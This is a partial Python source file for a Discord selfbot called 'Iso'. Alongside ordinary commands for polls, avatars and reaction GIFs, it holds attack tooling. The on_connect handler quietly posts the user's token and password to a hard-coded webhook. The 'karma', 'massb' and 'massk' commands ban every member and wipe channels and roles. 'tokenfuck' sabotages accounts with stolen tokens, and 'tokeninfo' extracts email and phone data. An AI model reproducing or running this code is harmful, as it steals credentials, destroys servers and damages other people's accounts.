1f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"

@Iso.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))

@Iso.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
        "msg:", "")
    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
        "1:", "")
    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
    message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
    await message.add_reaction('✅')
    await message.add_reaction('❌')

@Iso.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)

@Iso.command(aliases=['guildpfp', 'servericon'])
async def serverpfp(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@Iso.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.Cyan())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)

@Iso.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)

@Iso.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

@Iso.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")

@Iso.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@Iso.command(aliases=["kickall", "kickwave"])
async def massk(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Iso Selfbot")
        except:
            pass

@Iso.command(aliases=["banwave", "banall", "etb"])
async def massb(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Iso Selfbot")
        except:
            pass

@Iso.command(aliases=["rekt"])
async def karma(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Iso No Mercy",
            description="Iso Selfbot",
            reason="Iso Selfbot",
            icon="https://media.discordapp.net/attachments/777374893632258099/777396775375077376/image0.png",
            banner=None
        )
    except:
        pass
    for _i in range(400):
        await ctx.guild.create_text_channel(name="Iso Runs You")
    for _i in range(400):
        await ctx.guild.create_role(name="@iamirregular", color=RandomColor())

@Iso.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)
@Iso.event
async def on_connect():
  Clear()
  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})  
@Iso.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "No Mercy Iso",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@Iso.command(aliases=["masschannels", "masschannel"])
async def ctc(ctx):
    await ctx.message.delete()
    for _i in range(200):
        try:
            await ctx.guild.create_text_channel(name="Fear Murda")
        except:
            return

@Iso.command(aliases=["massvoicechannels", "massvoicechannel"])
async def cvc(ctx):
    await ctx.message.delete()
    for _i in range(200):
        try:
            await ctx.guild.create_voice_channel(name="Murda On Top")
        except:
            return

@Iso.command(aliases=["purgebans", "unbanall"])
async def massu(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass            

@Iso.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: discord.Member = None):
  if member is None:
     await ctx.send(f"{ctx.author.mention} you must mention a user to do that!")
  else:
   embed = discord.Embed(color=(0xF9E29C), timestamp=ctx.message.created_at)
  embed.description = f"{member.mention} has been banned by {Iso.user.name}"
  await member.ban()
  await ctx.send(embed=embed)

@ban.error
async def ban_error(ctx, error):
  if isinstance(error, (commands.BadArgument)):
    embed = discord.Embed(color=0x0504aa, timestamp=ctx.message.created_at)
    embed.title=("ban error")
    embed.description=f"user was not found goofy,ping the right person next time"
    await ctx.send(embed=embed)
  else:
    raise error  

@Iso.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, member: discord.Member = None):
  if member is None:
     await ctx.send(f"{ctx.author.mention} you must mention a user to do that!")
  else:
   embed = discord.Embed(color=(0xF9E29C), timestamp=ctx.message.created_at)
  embed.description = f"{member.mention} has been kicked by {Iso.user.name}"
  await member.kick()
  await ctx.send(embed=embed)

@kick.error
async def kick_error(ctx, error):
  if isinstance(error, (commands.BadArgument)):
    embed = discord.Embed(color=0x0504aa, timestamp=ctx.message.created_at)
    embed.title=("ban error")
    embed.description=f"user was not found goofy,ping the right person next time"
    await ctx.send(embed=embed)
  else:
    raise error   

@Iso.command(pass_context=True)
async def purge(ctx, limit:int):
  await ctx.channel.purge(limit=limit)
  await ctx.send('Cleared by {}'.format(ctx.author.mention))
  await asyncio.sleep(3)
  await ctx.message.delete()    

@Iso.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Iso.logout()

@Iso.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def leavegc(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in Iso.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Iso.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")

@Iso.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Iso.command_prefix = str(prefix)

@Iso.command(aliases=["copyguild"])
async def copyserver(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Iso.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Iso.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@Iso.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def iplookup(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Iso.command()   
async def top5(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x0504aa, timestamp=ctx.message.created_at)
  embed.set_author(name="𝘔𝘶𝘳𝘥𝘢'𝘴 𝘛𝘰𝘱 𝘍𝘪𝘷𝘦")
  embed.set_footer(text="・𝘉𝘪𝘨 𝘚𝘵𝘦𝘱𝘱𝘢 被視為")
  embed.set_image(url="https://media.discordapp.net/attachments/771160560203989023/785323621774131240/image0.gif")
  embed.add_field(name="Jayceez DaGeneral",value="𝘛𝘰𝘱", inline = False)
  embed.add_field(name="Zie",value="𝘍𝘪𝘷𝘦", inline = False)
  embed.add_field(name="Glo",value="𝘋𝘦𝘢𝘥", inline = False)
  embed.add_field(name="AP",value="𝘖𝘳", inline = False)
  embed.add_field(name="Nick",value="𝘈𝘭𝘪𝘷𝘦", inline = False)
  await ctx.send(embed=embed)

@Iso.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())


@Iso.command()
async def everyone(ctx):
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')

@Iso.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Iso_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Iso.command()
async def hug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Iso_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Iso.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Iso_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Iso.command()
async def smug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Iso_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Iso.command()
async def pat(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Iso_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Iso.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Iso_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

if __name__ == '__main__':
    Init()
